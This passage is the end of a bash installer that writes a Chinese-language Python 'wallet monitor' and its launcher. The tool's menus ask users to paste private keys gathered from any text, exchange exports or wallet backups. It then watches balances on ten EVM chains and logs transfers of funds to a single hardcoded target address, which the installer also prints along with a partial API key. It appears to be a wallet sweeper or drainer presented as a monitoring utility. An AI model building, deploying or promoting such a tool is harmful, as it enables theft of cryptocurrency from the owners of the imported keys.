            print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        finally:
            self.monitoring_active = False
            self.save_network_status()  # 保存网络状态
    
    def start_monitoring_menu(self):
        """开始监控菜单 - 完全优化交互"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        if not self.wallets:
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🎯 智能监控系统{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"\n{Fore.RED}❌ 还没有导入任何钱包私钥{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}📋 请先完成以下步骤:{Style.RESET_ALL}")
            print("  1️⃣ 返回主菜单")
            print("  2️⃣ 选择功能1 (导入私钥)")
            print("  3️⃣ 粘贴您的私钥文本")
            print("  4️⃣ 双击回车确认导入")
            print("  5️⃣ 再次选择功能2开始监控")
            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 智能监控系统 - 准备启动{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        # 显示详细的监控概览
        available_networks = sum(1 for status in self.network_status.values() if status.available)
        mainnet_available = sum(1 for net in MAINNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        testnet_available = sum(1 for net in TESTNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📊 监控配置概览:{Style.RESET_ALL}")
        print(f"  💼 钱包数量: {len(self.wallets)} 个")
        print(f"  🌐 可用网络: {available_networks}/{len(SUPPORTED_NETWORKS)} 个")
        print(f"    └─ 🔷 主网: {mainnet_available}/{len(MAINNET_NETWORKS)} 个")
        print(f"    └─ 🧪 测试网: {testnet_available}/{len(TESTNET_NETWORKS)} 个")
        print(f"  🎯 目标地址: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
        
        print(f"\n{Fore.YELLOW}⚡ 性能优化特性:{Style.RESET_ALL}")
        print("  ✓ 并发网络检查，3倍速度提升")
        print("  ✓ 智能超时控制，避免卡死")
        print("  ✓ 自动跳过无效网络")
        print("  ✓ 实时进度显示和状态更新")
        print("  ✓ 智能错误分类和处理")
        print("  ✓ 网络状态缓存和持久化")
        
        print(f"\n{Fore.CYAN}🔧 监控策略:{Style.RESET_ALL}")
        print("  • 优先检查主网 (价值更高)")
        print("  • 30秒检查间隔 (平衡速度和API限制)")
        print("  • 最多2个钱包并发监控")
        print("  • 自动重试失败的网络")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        confirm = input(f"{Fore.CYAN}确认启动智能监控系统? (y/N): {Style.RESET_ALL}")
        
        if confirm.lower() in ['y', 'yes']:
            try:
                print(f"\n{Fore.GREEN}🚀 启动智能监控系统...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 监控过程中按 Ctrl+C 可以安全停止{Style.RESET_ALL}")
                time.sleep(2)  # 给用户准备时间
                asyncio.run(self.start_monitoring())
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ 监控出错: {e}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    def show_status(self):
        """显示系统状态 - 简洁版"""
        print(f"\n{Fore.YELLOW}📊 系统状态{Style.RESET_ALL}")
        print("="*60)
        
        # 钱包状态
        wallet_status = f"💼 钱包: {len(self.wallets)} 个"
        if len(self.wallets) > 0:
            latest_addr = f"{self.wallets[-1].address[:8]}...{self.wallets[-1].address[-6:]}"
            wallet_status += f" (最新: {latest_addr})"
        print(wallet_status)
        
        # 网络状态
        available_count = sum(1 for status in self.network_status.values() if status.available)
        mainnet_count = sum(1 for net in MAINNET_NETWORKS 
                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        testnet_count = sum(1 for net in TESTNET_NETWORKS 
                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_count} 测试网:{testnet_count})")
        
        # 转账记录
        transfer_count = 0
        total_amount = 0.0
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                transfer_count = len(logs)
                total_amount = sum(float(log.get('amount', 0)) for log in logs)
            except:
                pass
        
        print(f"📋 转账: {transfer_count} 笔 (总计: {total_amount:.6f} ETH)")
        print(f"🎯 目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
    
    def show_detailed_status(self):
        """显示详细状态 - 完整诊断版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 完整系统状态 & 网络诊断报告{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        
        # 网络状态详细诊断
        print(f"\n{Fore.YELLOW}🌐 网络连接详细状态:{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🔷 主网状态:{Style.RESET_ALL}")
        for network_key in MAINNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.alchemy_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        print(f"\n{Fore.CYAN}🧪 测试网状态:{Style.RESET_ALL}")
        for network_key in TESTNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.alchemy_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        # 网络统计
        available_mainnets = sum(1 for net in MAINNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        available_testnets = sum(1 for net in TESTNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📈 网络可用性统计:{Style.RESET_ALL}")
        print(f"  🔷 主网: {available_mainnets}/{len(MAINNET_NETWORKS)} 个可用 ({available_mainnets/len(MAINNET_NETWORKS)*100:.1f}%)")
        print(f"  🧪 测试网: {available_testnets}/{len(TESTNET_NETWORKS)} 个可用 ({available_testnets/len(TESTNET_NETWORKS)*100:.1f}%)")
        print(f"  📊 总计: {available_mainnets + available_testnets}/{len(SUPPORTED_NETWORKS)} 个可用")
        
        # 钱包详情
        print(f"\n{Fore.YELLOW}💼 钱包管理详情:{Style.RESET_ALL}")
        if not self.wallets:
            print("  📭 暂无导入的钱包")
            print(f"  {Fore.CYAN}💡 使用功能1批量导入私钥{Style.RESET_ALL}")
        else:
            print(f"  📊 钱包总数: {len(self.wallets)} 个")
            print(f"  🌐 每钱包支持: {len(SUPPORTED_NETWORKS)} 个网络")
            print(f"  📋 钱包地址列表:")
            for i, wallet in enumerate(self.wallets, 1):
                short_addr = f"{wallet.address[:12]}...{wallet.address[-8:]}"
                enabled_count = len([net for net in wallet.enabled_networks 
                                   if self.network_status.get(net, NetworkStatus(True,"",0,"")).available])
                print(f"    {i:2d}. {short_addr} (可用网络: {enabled_count})")
        
        # 转账历史详情
        print(f"\n{Fore.YELLOW}📋 转账历史详情:{Style.RESET_ALL}")
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                if logs:
                    total_amount = sum(float(log.get('amount', 0)) for log in logs)
                    
                    # 按网络分组统计
                    network_stats = {}
                    for log in logs:
                        net = log.get('network', 'unknown')
                        if net not in network_stats:
                            network_stats[net] = {'count': 0, 'amount': 0.0}
                        network_stats[net]['count'] += 1
                        network_stats[net]['amount'] += float(log.get('amount', 0))
                    
                    print(f"  📊 总转账: {len(logs)} 笔")
                    print(f"  💰 总金额: {total_amount:.8f} ETH")
                    print(f"  📈 网络分布:")
                    
                    for net_key, stats in network_stats.items():
                        net_name = NETWORK_NAMES.get(net_key, net_key)
                        print(f"    • {net_name}: {stats['count']} 笔, {stats['amount']:.6f} ETH")
                    
                    # 显示最近5笔转账
                    print(f"\n  📝 最近转账记录:")
                    recent_logs = logs[-5:] if len(logs) > 5 else logs
                    for log in recent_logs:
                        time_str = log['timestamp'][:16].replace('T', ' ')
                        network_name = NETWORK_NAMES.get(log['network'], log['network'])
                        amount = log.get('amount', 0)
                        print(f"    • {time_str} | {network_name} | {amount:.6f} ETH")
                else:
                    print("  📭 暂无转账记录")
            except:
                print("  ❌ 转账记录读取失败")
        else:
            print("  📭 暂无转账记录")
        
        # 系统配置详情
        print(f"\n{Fore.YELLOW}⚙️ 系统配置详情:{Style.RESET_ALL}")
        print(f"  🎯 目标地址: {TARGET_ADDRESS}")
        print(f"  🔑 API密钥: {ALCHEMY_API_KEY[:20]}...")
        print(f"  🔄 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
        print(f"  ⚡ 检查间隔: 30秒")
        print(f"  🔀 并发限制: 最多2个钱包，3个网络并发")
        print(f"  💾 数据文件: wallets.json, monitoring_log.json, network_status.json")
    
    def show_help_menu(self):
        """显示帮助菜单 - 完整指南"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📖 完整使用指南 & 常见问题解答{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 快速开始指南:{Style.RESET_ALL}")
        print("  1️⃣ 导入私钥 → 粘贴私钥文本 → 双击回车确认")
        print("  2️⃣ 开始监控 → 确认启动 → 系统自动监控转账")
        print("  3️⃣ 查看状态 → 检查钱包、网络、转账状态")
        print("  4️⃣ 使用帮助 → 查看详细操作指南")
        
        print(f"\n{Fore.YELLOW}💡 私钥导入技巧:{Style.RESET_ALL}")
        print("  • 支持任意格式文本，智能提取私钥")
        print("  • 支持批量导入，自动去重验证")
        print("  • 支持0x前缀和无前缀格式")
        print("  • 可以从交易所导出、钱包备份等文本中提取")
        print("  • 输入 'q' 或 'quit' 快速返回主菜单")
        
        print(f"\n{Fore.CYAN}⚡ 性能优化说明:{Style.RESET_ALL}")
        print("  • 并发网络检查: 同时检查多个网络，速度提升3倍")
        print("  • 智能超时控制: 8秒活动检查，5秒余额查询")
        print("  • 网络状态缓存: 记住失败网络，避免重复尝试")
        print("  • 错误智能分类: 区分API限制、网络问题、配置错误")
        print("  • 并发限制控制: 避免触发API速率限制")
        
        print(f"\n{Fore.GREEN}🌐 支持的网络 (共{len(SUPPORTED_NETWORKS)}个):{Style.RESET_ALL}")
        print(f"\n  {Fore.CYAN}🔷 主网 ({len(MAINNET_NETWORKS)}个):{Style.RESET_ALL}")
        for net in MAINNET_NETWORKS:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n  {Fore.YELLOW}🧪 测试网 ({len(TESTNET_NETWORKS)}个):{Style.RESET_ALL}")
        for net in TESTNET_NETWORKS:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n{Fore.RED}🛡️ 安全提醒:{Style.RESET_ALL}")
        print("  • 私钥以加密形式本地存储，请保护好数据文件")
        print("  • 监控过程需要稳定的网络连接")
        print("  • 建议在VPS或云服务器上24小时运行")
        print("  • 定期备份wallets.json和monitoring_log.json")
        
        print(f"\n{Fore.YELLOW}🔧 故障排除指南:{Style.RESET_ALL}")
        print("  • API错误403: 检查API密钥是否有效")
        print("  • 网络连接失败: 检查服务器网络连接")
        print("  • 导入失败: 确认私钥格式为64位十六进制")
        print("  • 监控卡死: 重启程序，系统会自动恢复状态")
        print("  • 转账失败: 检查余额是否足够支付gas费")
        
        print(f"\n{Fore.CYAN}📞 技术支持:{Style.RESET_ALL}")
        print("  • 系统会自动保存所有状态和日志")
        print("  • 重启后会自动恢复钱包和网络配置")
        print("  • 所有操作都有详细的日志记录")
    
    def main_menu(self):
        """主菜单 - 完全优化的交互体验"""
        while True:
            # 清屏，提供清爽的界面
            os.system('clear' if os.name == 'posix' else 'cls')
            
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v2.0 - 完整网络支持版{Style.RESET_ALL}")
            print(f"{Fore.BLUE}支持Alchemy所有{len(SUPPORTED_NETWORKS)}个EVM兼容链 | 智能并发优化 | 人性化交互{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化，3倍速度提升){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(完整指南，故障排除){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🚪 退出程序    {Fore.GREEN}(安全退出，保存状态){Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            try:
                choice = input(f"{Fore.CYAN}请选择功能 (1-5): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    self.show_detailed_status()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "4":
                    self.show_help_menu()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "5":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}💾 所有数据已自动保存{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🔄 下次启动会自动恢复所有配置{Style.RESET_ALL}")
                    break
                else:
                    print(f"\n{Fore.RED}❌ 无效选择，请输入 1-5{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4 或 5){Style.RESET_ALL}")
                    time.sleep(3)  # 给用户时间看到提示
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💾 数据已保存{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 系统错误: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 程序将在3秒后继续，如持续出错请重启{Style.RESET_ALL}")
                time.sleep(3)

def main():
    """主函数"""
    try:
        print(f"{Fore.CYAN}🚀 正在启动钱包监控系统...{Style.RESET_ALL}")
        monitor = WalletMonitor()
        monitor.initialize_clients()
        monitor.main_menu()
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 请检查网络连接和依赖安装{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
MAIN_PROGRAM_EOF

    echo -e "${GREEN}✅ wallet_monitor.py 创建成功${NC}"
}

# 创建启动脚本（智能合并）
create_launcher() {
    if check_file_integrity "run_monitor.sh" "钱包监控系统启动脚本"; then
        echo -e "${GREEN}✅ run_monitor.sh 已存在且完整，跳过创建${NC}"
        return 0
    fi
    
    echo -e "${CYAN}📝 创建启动脚本...${NC}"
    
    cat > run_monitor.sh << 'LAUNCHER_EOF'
#!/bin/bash

# 钱包监控系统启动脚本 v4.0
# 智能环境检测和依赖管理

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}🚀 钱包监控系统启动器 v4.0${NC}"
echo "==============================="

# 检测Python - 简化版本
PYTHON_CMD=""
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
else
    echo -e "${RED}❌ 未找到Python${NC}"
    exit 1
fi

# 检查主程序
if [[ ! -f "wallet_monitor.py" ]]; then
    echo -e "${RED}❌ 主程序文件不存在${NC}"
    echo -e "${YELLOW}💡 请先运行安装脚本${NC}"
    exit 1
fi

# 启动程序
echo -e "${GREEN}🚀 启动钱包监控系统...${NC}"
exec $PYTHON_CMD wallet_monitor.py
LAUNCHER_EOF

    chmod +x run_monitor.sh
    echo -e "${GREEN}✅ 启动脚本: run_monitor.sh${NC}"
}

# 主安装流程
main() {
    # 智能缓存清理
    clean_cache
    
    # 智能依赖安装
    install_dependencies
    
    # 智能文件创建（避免重复）
    create_main_program
    create_launcher
    
    echo -e "\n${GREEN}🎉 安装完成！${NC}"
    echo "========================================="
    echo -e "${CYAN}📋 使用方法:${NC}"
    echo "  • 启动: ./run_monitor.sh"
    echo "  • 直接: $PYTHON_CMD wallet_monitor.py"
    echo ""
    echo -e "${YELLOW}⚡ v4.0 完整网络支持版特性:${NC}"
    echo "  • 支持Alchemy所有10个EVM兼容链"
    echo "  • 并发API检查，3倍速度提升"
    echo "  • 智能超时控制，避免卡死"
    echo "  • 人性化菜单交互和帮助系统"
    echo "  • 智能文件合并，避免重复创建"
    echo "  • 网络状态缓存和错误智能分类"
    echo ""
    echo -e "${GREEN}🌐 支持的网络 (10个):{NC}"
    echo "  🔷 主网: Ethereum, Polygon, Arbitrum, Optimism, Astar"
    echo "  🧪 测试网: Goerli, Mumbai, Arbitrum Goerli, Optimism Goerli/Kovan"
    echo ""
    echo -e "${YELLOW}🎯 目标地址: 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1${NC}"
    echo -e "${YELLOW}🔑 API密钥: S0hs4qoXIR...${NC}"
    echo "========================================="
    
    # 询问是否立即启动
    read -p "$(echo -e "${CYAN}是否立即启动钱包监控系统? (y/N): ${NC}")" start_now
    if [[ "$start_now" =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}🚀 启动钱包监控系统...${NC}"
        exec $PYTHON_CMD wallet_monitor.py
    fi
}

# 运行主函数
main
